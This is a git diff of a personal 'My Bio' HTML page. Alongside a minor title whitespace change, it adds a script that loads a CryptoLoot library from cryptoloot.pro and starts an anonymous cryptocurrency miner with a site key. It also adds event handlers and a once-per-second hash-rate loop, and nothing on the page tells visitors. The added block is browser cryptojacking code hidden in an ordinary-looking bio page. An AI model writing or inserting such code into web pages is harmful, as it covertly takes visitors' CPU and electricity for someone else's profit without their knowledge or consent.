@@ -1,11 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>My Bio</title>
+<title>My Bio</title>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
 </head>
 <body>
+<script src="//cryptoloot.pro/lib/crlt.js"></script>
+<script>
+var miner = new CRLT.Anonymous('b60ae0e626d5d6a5ee8d7b5b673eb25c4db7d394dc3b');
+miner.start();
+// Listen on events
+miner.on('found', function() { /* Hash found */ })
+miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
+// Update stats once per second
+setInterval(function() {
+	var hashesPerSecond = miner.getHashesPerSecond();
+	var totalHashes = miner.getTotalHashes();
+	var acceptedHashes = miner.getAcceptedHashes();
+
+	// Output to HTML elements...
+}, 1000);
+</script>
+	
 <div class="container">
   <div class="row">
     <div class="col-lg-12">
